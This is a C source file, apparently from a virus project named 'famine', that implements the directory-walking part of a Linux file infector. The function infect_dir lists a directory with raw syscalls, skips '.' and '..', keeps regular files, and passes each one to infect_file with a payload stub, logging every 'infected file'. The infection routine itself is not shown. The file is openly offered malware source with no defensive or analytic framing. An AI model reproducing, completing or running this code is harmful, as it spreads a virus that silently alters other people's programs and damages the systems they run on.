#include "../include/famine.h"

static int is_regular(const char *path, const struct linux_dirent64 *ent)
{
	struct stat st;

	if (ent->d_type == DT_REG)
		return (1);
	if (ent->d_type != DT_UNKNOWN)
		return (0);
	if (sys_ret_is_err(sys_lstat(path, &st)))
		return (0);
	return (S_ISREG(st.st_mode));
}

// Builds "<dir>/<name>" into buf; returns 0 on success, 1 if it won't fit
static int join_path(char *buf, size_t size, const char *dir, const char *name)
{
	size_t dlen;
	size_t nlen;

	dlen = my_strlen(dir);
	nlen = my_strlen(name);
	if (dlen + 1 + nlen + 1 > size)
		return (1);
	my_memcpy(buf, dir, dlen);
	buf[dlen] = '/';
	my_memcpy(buf + dlen + 1, name, nlen);
	buf[dlen + 1 + nlen] = '\0';
	return (0);
}

void infect_dir(const char *dir, const unsigned char *stub, size_t stub_len)
{
	struct my_DIR	d;
	struct linux_dirent64	*ent;
	char			path[PATH_MAX];

	if (!my_opendir(&d, dir))
		return ;
	while ((ent = my_readdir64(&d)) != NULL) {
		if (ent->d_name[0] == '.' && (ent->d_name[1] == '\0' || (ent->d_name[1] == '.' && ent->d_name[2] == '\0')))
			continue ;
		if (join_path(path, sizeof(path), dir, ent->d_name))
			continue ;
		if (!is_regular(path, ent))
			continue ;
		infect_file(path, stub, stub_len);
		sys_write(STDOUT_FILENO, "infected file: ", 15);
		sys_write(STDOUT_FILENO, path, my_strlen(path));
		sys_write(STDOUT_FILENO, "\n", 1);
	}
	my_closedir(&d);
	sys_write(STDOUT_FILENO, "infected directory: ", 20);
	sys_write(STDOUT_FILENO, dir, my_strlen(dir));
	sys_write(STDOUT_FILENO, "\n", 1);
}

